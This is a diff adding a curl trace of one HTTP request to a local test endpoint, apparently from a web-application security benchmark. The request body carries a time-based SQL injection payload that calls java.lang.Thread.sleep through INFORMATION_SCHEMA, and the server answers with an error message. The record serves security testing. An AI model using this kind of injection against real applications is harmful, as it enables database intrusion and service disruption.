@@ -1,0 +1,32 @@
+== Info: About to connect() to localhost port 8080 (#0)
+== Info:   Trying ::1... == Info: connected
+== Info: Connected to localhost (::1) port 8080 (#0)
+=> Send header, 276 bytes (0x114)
+0000: POST /benchmark/BenchmarkTest00438 HTTP/1.1
+002d: User-Agent: curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7
+006d:  NSS/3.19.1 Basic ECC zlib/1.2.3 libidn/1.18 libssh2/1.4.2
+00a9: Host: localhost:8080
+00bf: Accept: */*
+00cc: Content-Length: 156
+00e1: Content-Type: application/x-www-form-urlencoded
+0112: 
+=> Send data, 156 bytes (0x9c)
+0000: vector='; select "java.lang.Thread.sleep"(5000) from INFORMATION
+0040: _SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = 'SYSTEM_COLUMNS' and C
+0080: OLUMN_NAME = 'TABLE_NAME' --
+<= Recv header, 17 bytes (0x11)
+0000: HTTP/1.1 200 OK
+<= Recv header, 27 bytes (0x1b)
+0000: Server: Apache-Coyote/1.1
+<= Recv header, 44 bytes (0x2c)
+0000: Content-Type: text/html;charset=ISO-8859-1
+<= Recv header, 20 bytes (0x14)
+0000: Content-Length: 26
+<= Recv header, 37 bytes (0x25)
+0000: Date: Tue, 05 Apr 2016 13:04:12 GMT
+<= Recv header, 2 bytes (0x2)
+0000: 
+<= Recv data, 26 bytes (0x1a)
+0000: Error processing request..
+== Info: Connection #0 to host localhost left intact
+== Info: Closing connection #0
